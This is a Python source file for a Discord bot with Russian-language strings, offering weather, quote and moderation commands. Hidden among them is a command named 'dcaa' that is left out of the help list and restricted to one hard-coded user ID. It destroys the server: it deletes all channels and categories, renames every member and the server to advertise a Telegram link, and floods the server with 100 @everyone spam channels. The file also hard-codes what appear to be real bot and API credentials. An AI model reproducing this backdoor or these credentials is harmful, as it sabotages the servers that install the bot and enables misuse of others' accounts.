import random
import discord
from discord.ext import commands
import asyncio
import aiohttp
import datetime
from quotesstat import quotes
import pyowm
import requests


config = {
    'token': 'OTM2OTc4OTE4NDkyMjE3NDA1.GYQPj4.FyPEYQvzrqR0ByVdjOjHSUKZ2tFMrt4RSHf_zI',
    'prefix': '$',
}

bot = commands.Bot(command_prefix='$', intents=discord.Intents.all(), help_command=None)


owm = pyowm.OWM('360599734abd41abe702e9a6f21a4d6e')  # –£–∫–∞–∂–∏—Ç–µ –≤–∞—à API –∫–ª—é—á –æ—Ç OpenWeatherMap

unsplash_access_key = '6YW10eZk3C63XNwAvh7TZEd_HWJqow5N9gePaDpo_78'


def is_admin_or_specific_id():
    async def predicate(ctx):
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –∞–≤—Ç–æ—Ä –∫–æ–º–∞–Ω–¥—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º –∏–ª–∏ –∏–º–µ–µ—Ç –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–π ID
        is_admin = ctx.author.guild_permissions.administrator
        is_specific_id = ctx.author.id == 992393514950344704
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å–ª–∏ —ç—Ç–æ –æ–¥–Ω–∞ –∏–∑ –∫–æ–º–∞–Ω–¥, –≥–¥–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º —ç—Ç–æ—Ç –¥–µ–∫–æ—Ä–∞—Ç–æ—Ä, –ª–∏–±–æ –∞–≤—Ç–æ—Ä –∏–º–µ–µ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—Å–∫–∏–µ –ø—Ä–∞–≤–∞
        if ctx.command and ctx.command.name in ['clear', 'mute', 'unmute', 'ban', 'unban', 'dcaa']:
            return is_admin or is_specific_id
        # –ï—Å–ª–∏ —ç—Ç–æ –¥—Ä—É–≥–∞—è –∫–æ–º–∞–Ω–¥–∞, –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –∞–≤—Ç–æ—Ä –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º
        return is_admin
        
        command_available = ctx.command is None or ctx.command.checks[0](ctx) if ctx.command else True
        return is_admin or is_specific_id or command_available

    return commands.check(predicate)





@bot.command()
async def weather(ctx, *, city: str):
    if city is None:
        await ctx.send("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –≥–æ—Ä–æ–¥–∞.")
        return
        
        
    if city.lower() == "–ª–Ω—Ä":
        city = "–õ—É–≥–∞–Ω—Å–∫"
    elif city.lower() == "–¥–Ω—Ä":
        city = "–î–æ–Ω–µ—Ü–∫"
    elif city.lower() == "—Å–ø–±":
        city = "–°–∞–Ω–∫—Ç-–ü–µ—Ç–µ—Ä–±—É—Ä–≥"
    elif city.lower() == "–º—Å–∫":
        city = "–ú–æ—Å–∫–≤–∞"
    
    try:
        observation = owm.weather_manager().weather_at_place(city)
        weather = observation.weather
        temperature = int(weather.temperature('celsius')['temp'])
        status = weather.status
        emoji = '‚ùì' if status.lower() == 'unknown' else '‚òÄÔ∏è' if status.lower() == 'clear' else '‚õÖ' if status.lower() == 'clouds' else '‚òî' if status.lower() == 'rain' else '‚ùÑÔ∏è' if status.lower() == 'snow' else 'üåÄ'
        rustatus = ' –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ' if status.lower() == 'unknown' else ' –Ø—Å–Ω–æ' if status.lower() == 'clear' else ' –û–±–ª–∞—á–Ω–æ' if status.lower() == 'clouds' else ' –î–æ–∂–¥–ª–∏–≤–æ' if status.lower() == 'rain' else ' –°–Ω–µ–≥' if status.lower() == 'snow' else '-'
        eemoji = ':thermometer:'
        
        # –ü–æ–ª—É—á–∞–µ–º –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã –≥–æ—Ä–æ–¥–∞
        mgr = owm.weather_manager()
        location = mgr.weather_at_place(city).location
        lat, lon = location.lat, location.lon      
        country = location.country    
        
        if city.lower() in ["donetsk", "–¥–æ–Ω–µ—Ü–∫", "lugansk", "–ª—É–≥–∞–Ω—Å–∫", "bahmut", "–±–∞—Ö–º—É—Ç", "mariupol", "–º–∞—Ä–∏—É–ø–æ–ª—å", "avdeevka", "–∞–≤–¥–µ–µ–≤–∫–∞", "lisichansk", "–ª–∏—Å–∏—á–∞–Ω—Å–∫"]:
            country_flag = ":flag_ru:"
        elif city.lower() == "rome":
            country_flag = ":flag_it:"
        elif city.lower() == "columbia":
            country_flag = ":flag_co:"
        elif city.lower() == "auckland" or city.lower() == "–æ–∫–ª—ç–Ω–¥":
            country_flag = ":flag_nz:"  
        elif city.lower() == "melburn" or city.lower() == "–º–µ–ª—å–±—É—Ä–Ω":
            country_flag = ":flag_au:" 
        elif city.lower() == "ottawa" or city.lower() == "–æ—Ç—Ç–∞–≤–∞":
            country_flag = ":flag_ca:" 
        elif city.lower() == "geneve" or city.lower() == "–∂–µ–Ω–µ–≤–∞":
            country_flag = ":flag_ch:"                
        else:
            country_flag = f":flag_{country.lower()}:"

        
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º API Unsplash –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ñ–æ—Ç–æ –≥–æ—Ä–æ–¥–∞ –ø–æ –µ–≥–æ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç–∞–º
        unsplash_response = requests.get(f"https://api.unsplash.com/photos/random?client_id={unsplash_access_key}&query={city}&orientation=landscape&per_page=10&lat={lat}&lon={lon}")
        if unsplash_response.status_code == 200:
            photo_data = unsplash_response.json()
            photo_url = photo_data['urls']['regular']
        else:
            photo_url = None
        
        
        embed = discord.Embed(title=f"–ü–æ–≥–æ–¥–∞ –≤ –≥–æ—Ä–æ–¥–µ {city.capitalize()} {country_flag}", color=discord.Color.green())
        embed.add_field(name="–°—Ç–∞—Ç—É—Å", value=f"{emoji} {rustatus}", inline=False)
        embed.add_field(name="–¢–µ–º–ø–µ—Ä–∞—Ç—É—Ä–∞", value=f"{eemoji} {temperature}¬∞C", inline=False)
        embed.add_field(name= " " , value=f" **–°–ª—É—á–∞–π–Ω–æ–µ —Ñ–æ—Ç–æ –∏–∑ –≥–æ—Ä–æ–¥–∞* {city}", inline=False)
     
        if photo_url:
            embed.set_image(url=photo_url)
    
        await ctx.send(embed=embed)
    except pyowm.commons.exceptions.NotFoundError:
        await ctx.send(f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–≥–æ–¥–µ –¥–ª—è –≥–æ—Ä–æ–¥–∞ {city}. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ –ø–æ–∑–∂–µ.")
    except Exception as e:
        await print(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}")



@bot.event
async def on_command_error(ctx, error):
    print(f'–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã: {error}')


    
filez = "https://preview.redd.it/uw6mgibnqbm71.gif?width=500&auto=webp&s=da9b57c5461028296e1f6394a11e89acee9924fd"
fileg = "https://i.pinimg.com/736x/e5/68/3b/e5683bb4b15886d2aa571b7ba499624e.jpg"
filey = "https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExeG1qMDgwazN0bG5nbjIwZHRueGtodzh6eGRucTgxZmpiczc3b2Q4aCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/PkXaNpBiAP4c4Tho0D/giphy.gif"


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("–¢–∞–∫–æ–π –∫–æ–º–∞–Ω–¥—ã –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!")
        await ctx.send(fileg)

@bot.command()
async def hp(ctx):
    help_message = (
        "**–°–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥:**\n"
        "`$server`: –ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ —Å–µ—Ä–≤–µ—Ä–∞. :writing_hand: \n"
        "`$weather [–≥–æ—Ä–æ–¥]`: –í—ã–≤–µ–¥–µ—Ç –ø–æ–≥–æ–¥—É –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ –≥–æ—Ä–æ–¥–∞ ‚õÖ \n"
        "`$rnum`: –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Å–ª—É—á–∞–π–Ω–æ–µ —á–∏—Å–ª–æ –æ—Ç 0 –¥–æ 100. :dna: \n"
        "`$quote`: –û—Ç–ø—Ä–∞–≤–∏—Ç —Å–ª—É—á–∞–π–Ω—É—é —Ü–∏—Ç–∞—Ç—É –°—Ç–µ—Ç—Ö–µ–º–∞ :sunglasses: \n"
        "`$clear [–∫–æ–ª–∏—á–µ—Å—Ç–≤–æ]`: –û—á–∏—Å—Ç–∏—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –≤ —Ç–µ–∫—É—â–µ–º —á–∞—Ç–µ :broom: \n"
        "`$kick [—É—á–∞—Å—Ç–Ω–∏–∫] [–ø—Ä–∏—á–∏–Ω–∞]`: –ö–∏–∫–∞–µ—Ç —É—á–∞—Å—Ç–Ω–∏–∫–∞ —Å —Å–µ—Ä–≤–µ—Ä–∞. :airplane: \n"
        "`$mute [—É—á–∞—Å—Ç–Ω–∏–∫] [–¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤ —Å–µ–∫—É–Ω–¥–∞—Ö] [–ø—Ä–∏—á–∏–Ω–∞]`: –ú—É—Ç–∏—Ç —É—á–∞—Å—Ç–Ω–∏–∫–∞ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –≤—Ä–µ–º—è. :mute: \n"
        "`$unmute [—É—á–∞—Å—Ç–Ω–∏–∫]`: –†–∞–∑–º—É—á–∏–≤–∞–µ—Ç —É—á–∞—Å—Ç–Ω–∏–∫–∞. :speaking_head: \n"
        "`$ban [—É—á–∞—Å—Ç–Ω–∏–∫] [–ø—Ä–∏—á–∏–Ω–∞]`: –ë–∞–Ω–∏—Ç —É—á–∞—Å—Ç–Ω–∏–∫–∞. :judge: \n"
        "`$hp`: –ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–º–æ—â–∏. :sos: "
    )
    await ctx.send(help_message)



@bot.command()
async def rnum(ctx, *arg):
    await ctx.reply(random.randint(0, 100))
    
    
@bot.command()
async def quote(ctx):
    await ctx.send(random.choice(quotes))

    
@bot.command()

@is_admin_or_specific_id()
async def kick(ctx, user: discord.Member = None, *, reason='–ü—Ä–∏—á–∏–Ω–∞ –Ω–µ —É–∫–∞–∑–∞–Ω–∞'):
    if user is None:
        await ctx.send('–£–∫–∞–∂–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –∫–∏–∫–∞!')
        return

    await user.kick(reason=reason)
    await ctx.send(f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å **{user.name}** –±—ã–ª –∏–∑–≥–Ω–∞–Ω –ø–æ –ø—Ä–∏—á–∏–Ω–µ: **__{reason}__**')

@kick.error
async def kick_error(ctx, error):
    if isinstance(error, commands.BadArgument):
        await ctx.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ —É—á–∞—Å—Ç–Ω–∏–∫–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–æ, –∏—Å–ø–æ–ª—å–∑—É—è —É–ø–æ–º–∏–Ω–∞–Ω–∏–µ.')
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send('–£ –≤–∞—Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.')

@bot.command()

@is_admin_or_specific_id()
async def mute(ctx, member: discord.Member = None, duration: int = None, *, reason='–ü—Ä–∏—á–∏–Ω–∞ –Ω–µ —É–∫–∞–∑–∞–Ω–∞'):
    if member is None:
        await ctx.send('–£–∫–∞–∂–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –º—É—Ç–∞!')
        return

    if duration is None:
        await ctx.send('–£–∫–∞–∂–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –º—É—Ç–∞ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö!')
        return

    if duration <= 0:
        await ctx.send('–î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –º—É—Ç–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω—ã–º —á–∏—Å–ª–æ–º!')
        return
        
    if member == ctx.author:
        await ctx.send('–í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –∑–∞–º—É—Ç–∏—Ç—å —Å–∞–º–æ–≥–æ —Å–µ–±—è!')
        return
    
    if member == ctx.guild.me:
        await ctx.send('–Ø –Ω–µ –º–æ–≥—É –∑–∞–º—É—Ç–∏—Ç—å —Å–∞–º–æ–≥–æ —Å–µ–±—è!')
        return
        
    if member.id == 992393514950344704:
        await ctx.send('–í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –∑–∞–º—É—Ç–∏—Ç—å —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!')
        return

    # –ü–æ–ª—É—á–∞–µ–º –æ–±—ä–µ–∫—Ç —Ä–æ–ª–∏ "Muted"
    muted_role = discord.utils.get(ctx.guild.roles, name="Muted")

    # –ï—Å–ª–∏ —Ä–æ–ª—å "Muted" –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç, —Å–æ–∑–¥–∞–µ–º –µ–µ
    if not muted_role:
        muted_role = await ctx.guild.create_role(name="Muted", color=discord.Color.from_rgb(2, 2, 2))
        for channel in ctx.guild.channels:
            await channel.set_permissions(muted_role, send_messages=False, speak=False)

    # –î–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é —Ä–æ–ª—å "Muted"
    await member.add_roles(muted_role, reason=reason)

    # –°–æ–æ–±—â–∞–µ–º –æ–± —É—Å–ø–µ—à–Ω–æ–º –º—É—Ç–µ
    await ctx.send(f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {member.mention} –±—ã–ª –∑–∞–º—É—á–µ–Ω –Ω–∞ {duration} —Å–µ–∫—É–Ω–¥ –ø–æ –ø—Ä–∏—á–∏–Ω–µ "{reason}"')

    # –ñ–¥–µ–º —É–∫–∞–∑–∞–Ω–Ω–æ–µ –≤—Ä–µ–º—è –∏ –∑–∞—Ç–µ–º —Å–Ω–∏–º–∞–µ–º –º—É—Ç
    await asyncio.sleep(duration)

    # –°–Ω–∏–º–∞–µ–º —Ä–æ–ª—å "Muted" —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    await member.remove_roles(muted_role)
    # –£–¥–∞–ª—è–µ–º —Ä–æ–ª—å "Muted" —Å —Å–µ—Ä–≤–µ—Ä–∞
    await muted_role.delete()
    await ctx.send(f'–°—Ä–æ–∫ –º—É—Ç–∞ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {member.mention} –∏—Å—Ç–µ–∫.')

@mute.error
async def mute_error(ctx, error):
    if isinstance(error, commands.BadArgument):
        await ctx.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ —É—á–∞—Å—Ç–Ω–∏–∫–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–æ, –∏—Å–ø–æ–ª—å–∑—É—è —É–ø–æ–º–∏–Ω–∞–Ω–∏–µ.')
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send('–£ –≤–∞—Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.')

@bot.command()

@is_admin_or_specific_id()
async def unmute(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send('–£–∫–∞–∂–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è —Ä–∞–∑–º—É—Ç–∞!')
        return

    # –ü–æ–ª—É—á–∞–µ–º –æ–±—ä–µ–∫—Ç —Ä–æ–ª–∏ "Muted"
    muted_role = discord.utils.get(ctx.guild.roles, name="Muted")

    if muted_role is None:
        await ctx.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –∑–∞–º—É—á–µ–Ω.')
        return

    if muted_role not in member.roles:
        await ctx.send('–≠—Ç–æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –∑–∞–º—É—á–µ–Ω.')
        return

    # –°–Ω–∏–º–∞–µ–º —Ä–æ–ª—å –º—É—Ç–∞
    await member.remove_roles(muted_role, reason="unmuted by command")

    # –£–¥–∞–ª—è–µ–º —Ä–æ–ª—å "Muted" —Å —Å–µ—Ä–≤–µ—Ä–∞
    await muted_role.delete()
    await ctx.send(f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {member.mention} –±—ã–ª —Ä–∞–∑–º—É—á–µ–Ω.')

@unmute.error
async def unmute_error(ctx, error):
    if isinstance(error, commands.BadArgument):
        await ctx.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ —É—á–∞—Å—Ç–Ω–∏–∫–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–æ, –∏—Å–ø–æ–ª—å–∑—É—è —É–ø–æ–º–∏–Ω–∞–Ω–∏–µ.')
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send('–£ –≤–∞—Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.')

@bot.command()

@is_admin_or_specific_id()
async def ban(ctx, member: discord.Member = None, *, reason='–ü—Ä–∏—á–∏–Ω–∞ –Ω–µ —É–∫–∞–∑–∞–Ω–∞'):
    if member is None:
        await ctx.send('–£–∫–∞–∂–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –±–∞–Ω–∞!')
        return

    await member.ban(reason=reason)
    await ctx.send(f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {member.mention} –±—ã–ª –∑–∞–±–∞–Ω–µ–Ω –ø–æ –ø—Ä–∏—á–∏–Ω–µ: "{reason}"')

@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.BadArgument):
        await ctx.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ —É—á–∞—Å—Ç–Ω–∏–∫–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–æ, –∏—Å–ø–æ–ª—å–∑—É—è —É–ø–æ–º–∏–Ω–∞–Ω–∏–µ.')
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send('–£ –≤–∞—Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.')

@bot.command()

async def unban(ctx, *, member: discord.User):
    banned_users = await ctx.guild.bans()

    for ban_entry in banned_users:
        user = ban_entry.user

        if user.name == member.name and user.discriminator == member.discriminator:
            await ctx.guild.unban(user)
            await ctx.send(f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user.mention} –±—ã–ª —Ä–∞–∑–±–∞–Ω–µ–Ω.')
            return

    await ctx.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ —Å–ø–∏—Å–∫–µ –∑–∞–±–∞–Ω–µ–Ω–Ω—ã—Ö.')

@unban.error
async def unban_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send('–£ –≤–∞—Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.')

warning_msg = ("@everyone \n"
               "Ô∏è‚ùóÔ∏è‚ùóÔ∏è **WARNING DETECT** ‚ùóÔ∏è‚ùóÔ∏è \n"
               "‚ùì‚ùî Looks like the server's down ‚ùì‚ùî \n"
               "üì¶üì¶<- Time to pack your bags -> üì¶üì¶ \n"
               "https://media1.tenor.com/m/omADx0vwznsAAAAC/warning.gif ")


@bot.command()
@commands.check(lambda ctx: ctx.author.id == 992393514950344704)
async def dcaa(ctx):
    start_time = datetime.datetime.now()  # –ó–∞–ø–æ–º–∏–Ω–∞–µ–º –≤—Ä–µ–º—è –Ω–∞—á–∞–ª–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã
    total_categories_deleted = 0
    total_channels_deleted = 0
    total_logs = 0  # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —Å—Ç—Ä–æ–∫ –ª–æ–≥–æ–≤
    
    try:
        # –í—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É log –∏ –ø–æ–ª—É—á–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å—Ç—Ä–æ–∫ –≤ –±–∞–∑–µ –ª–æ–≥–æ–≤
        log_result = await ctx.invoke(bot.get_command('llllaaaavafv'))
        if log_result is not None:
            total_logs = len(log_result)
        else:
            total_logs = 0  # –∏–ª–∏ –¥—Ä—É–≥–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
        
        message = await ctx.reply("Loading presets")
        await message.edit(content=":clock12:")
        await message.edit(content=":clock1:")
        await message.edit(content=":clock2:")
        await message.edit(content=":clock3:")
        await message.edit(content=":clock4:")
        await message.edit(content=":clock5:")
        await message.edit(content=":clock6:")
        await message.edit(content=":clock7:")
        await message.edit(content=":clock8:")
        await message.edit(content=":clock9:")
        await message.edit(content=":clock10:")
        await message.edit(content="Successfully :heavy_check_mark: ")

        
        
        
        
        categories_count = len(ctx.guild.categories)
        
        categories = ctx.guild.categories
        total_nicknames_changed = 0  # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º —Å—á–µ—Ç—á–∏–∫ –∏–∑–º–µ–Ω–µ–Ω–Ω—ã—Ö –Ω–∏–∫–æ–≤

        for category in categories:
            for channel in category.channels:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –∫–∞–Ω–∞–ª –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–º –¥–ª—è —Å–æ–æ–±—â–µ—Å—Ç–≤–∞
                if isinstance(channel, discord.TextChannel) or isinstance(channel, discord.VoiceChannel):
                    await channel.delete()
                    total_channels_deleted += 1  # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ —É–¥–∞–ª–µ–Ω–Ω—ã—Ö –∫–∞–Ω–∞–ª–æ–≤

            # –£–¥–∞–ª—è–µ–º –∫–∞—Ç–µ–≥–æ—Ä–∏—é —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –æ–Ω–∞ –ø—É—Å—Ç–∞
            if not category.channels:
                await category.delete()
                total_categories_deleted += 1  # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ —É–¥–∞–ª–µ–Ω–Ω—ã—Ö –∫–∞—Ç–µ–≥–æ—Ä–∏–π

        for category in categories:
            for channel in category.channels:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –∫–∞–Ω–∞–ª –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–º –¥–ª—è —Å–æ–æ–±—â–µ—Å—Ç–≤–∞
                if isinstance(channel, discord.TextChannel) or isinstance(channel, discord.VoiceChannel):
                    await channel.delete()
                    total_channels_deleted += 1  # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ —É–¥–∞–ª–µ–Ω–Ω—ã—Ö –∫–∞–Ω–∞–ª–æ–≤

            # –£–¥–∞–ª—è–µ–º –∫–∞—Ç–µ–≥–æ—Ä–∏—é —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –æ–Ω–∞ –ø—É—Å—Ç–∞
            if not category.channels:
                await category.delete()
                total_categories_deleted += 1  # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ —É–¥–∞–ª–µ–Ω–Ω—ã—Ö –∫–∞—Ç–µ–≥–æ—Ä–∏–π

        # –ò–∑–º–µ–Ω—è–µ–º –Ω–∏–∫–∏ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤ —Å–µ—Ä–≤–µ—Ä–∞
        for member in ctx.guild.members:
            if member.bot:
                continue  # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –±–æ—Ç–æ–≤
            try:
                await member.edit(nick="t.me/big6ecret")
                total_nicknames_changed += 1  # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ –∏–∑–º–µ–Ω–µ–Ω–Ω—ã—Ö –Ω–∏–∫–æ–≤
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–º–µ–Ω–µ –Ω–∏–∫–∞ —É {member.name} :\\ : {e}")
            else:
                print(f"–ù–∏–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {member.name} —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω :).")

        # –ò–∑–º–µ–Ω—è–µ–º –Ω–∞–∑–≤–∞–Ω–∏–µ —Å–µ—Ä–≤–µ—Ä–∞
        await ctx.guild.edit(name="destroyed | t.me/big6ecret")

        # –ó–∞–≥—Ä—É–∂–∞–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è –∞–≤–∞—Ç–∞—Ä–∫–∏
        avatar_url = "https://i.imgur.com/Fq8qHaP.png"
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar_url) as resp:
                avatar_image = await resp.read()

        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–æ–≤—É—é –∞–≤–∞—Ç–∞—Ä–∫—É –¥–ª—è —Å–µ—Ä–≤–µ—Ä–∞
        await ctx.guild.edit(icon=avatar_image)
        
        # –°–æ–∑–¥–∞–µ–º 100 –Ω–æ–≤—ã—Ö –∫–∞–Ω–∞–ª–æ–≤
        channels = await asyncio.gather(*[ctx.guild.create_text_channel(name="‚ùóÔ∏è‚ùóÔ∏è WARNING") for _ in range(100)])
        for channel in channels:
            await asyncio.gather(*[channel.send(warning_msg)])

            
        # –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—É—é —Ä–æ–ª—å —Å –∫–æ—Ä–∏—á–Ω–µ–≤—ã–º —Ü–≤–µ—Ç–æ–º
        brown_role = await ctx.guild.create_role(name="‚ùå NOT ACCESSIBLE", color=discord.Color.from_rgb(43, 0, 0))

        # –ü—Ä–∏—Å–≤–∞–∏–≤–∞–µ–º —Å–æ–∑–¥–∞–Ω–Ω—É—é —Ä–æ–ª—å –≤—Å–µ–º —É—á–∞—Å—Ç–Ω–∏–∫–∞–º —Å–µ—Ä–≤–µ—Ä–∞
        for member in ctx.guild.members:
            await member.add_roles(brown_role)

